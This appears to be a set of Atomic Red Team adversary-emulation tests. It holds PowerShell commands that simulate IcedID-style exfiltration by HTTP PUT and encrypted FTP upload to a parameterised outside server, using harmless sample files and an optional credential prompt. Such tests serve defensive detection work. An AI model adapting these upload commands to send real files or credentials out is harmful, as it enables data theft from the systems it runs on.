atomic_tests.name: IcedID Botnet HTTP PUT
atomic_tests.description:
Creates a text file
Tries to upload to a server via HTTP PUT method with ContentType Header
Deletes a created file

executor.name: powershell
executor.command:
$fileName = "#{file}"
$url = "#{domain}"
$file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil Test"
$contentType = "application/octet-stream"
try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}

atomic_tests.name: Exfiltration via Encrypted FTP
atomic_tests.description: Simulates encrypted file transfer to an FTP server. For testing purposes, a free FTP testing portal is available at https://sftpcloud.io/tools/free-ftp-server, providing a temporary FTP server for 60 minutes. Use this service responsibly for testing and validation only.

executor.name: powershell
executor.command:
$sampleData = "Sample data for exfiltration test"
Set-Content -Path "#{sampleFile}" -Value $sampleData
$ftpUrl = "#{ftpServer}"
$creds = Get-Credential -Credential "#{credentials}"
Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile "#{sampleFile}" -Credential $creds

sampleFile.description: Path of the sample file to exfiltrate.
